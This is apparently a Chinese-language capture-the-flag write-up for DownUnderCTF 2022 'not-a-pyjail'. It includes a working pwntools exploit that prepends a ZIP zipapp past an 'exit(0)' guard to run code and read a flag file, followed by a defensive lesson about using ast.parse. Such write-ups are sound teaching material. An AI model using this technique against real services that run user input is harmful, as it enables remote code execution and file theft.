# DownUnderCTF 2022 not-a-pyjail Writeup

## 题目简述

服务自称只做 Python 语法检查。它先在临时文件开头写入 `exit(0)\n`，再追加用户输入，随后实际上调用 `python3 <临时文件>`。普通源码会在第一行直接退出，但 Python 还支持把 ZIP 归档当作可执行 zipapp；ZIP 又允许在归档前带任意前缀，从而绕过预置的 `exit(0)`。

## 解题过程

服务端逻辑为：

```python
code = b'exit(0)\n'
code += user_input
subprocess.Popen(
    ['python3', sandbox.name],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
```

Python 启动脚本时会识别可导入的 ZIP 归档，并执行其中的 `__main__.py`。ZIP 的中央目录记录了各成员相对位置，自解压文件常用的前置数据不会破坏归档，因此服务追加在前面的 `exit(0)\n` 只成为 ZIP 前缀，而不是最终被解释的源码。

程序丢弃子进程 stdout，只在退出码非零时打印 stderr。因此 payload 应把 flag 写到 stderr 并主动失败：

```python
import io
import zipfile
from pwn import remote

main = '''
import sys
sys.stderr.write(open('/chal/flag.txt').read())
raise SystemExit(1)
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('__main__.py', main)

io = remote('target', 1337)
io.recvuntil(b'Write __EOF__ to end.\n')
io.send(buf.getvalue())
io.send(b'\n__EOF__\n')
io.interactive()
```

临时文件最终是“`exit(0)` 前缀 + 合法 ZIP”。解释器从归档加载 `__main__.py`，stderr 被服务回显：

```text
DUCTF{next_time_ill_just_use_ast.parse}
```

## 方法总结

题目并没有“不执行代码”，而是直接启动了解释器，只试图用首行 `exit(0)` 阻断普通文本脚本。Python 的输入不只一种语法载体，zipapp 分支使前置文本失去保护作用；非零退出和 stderr 又提供了稳定回显通道。若目标只是语法检查，应在隔离进程中调用 `ast.parse`，绝不能执行用户提供的字节流。
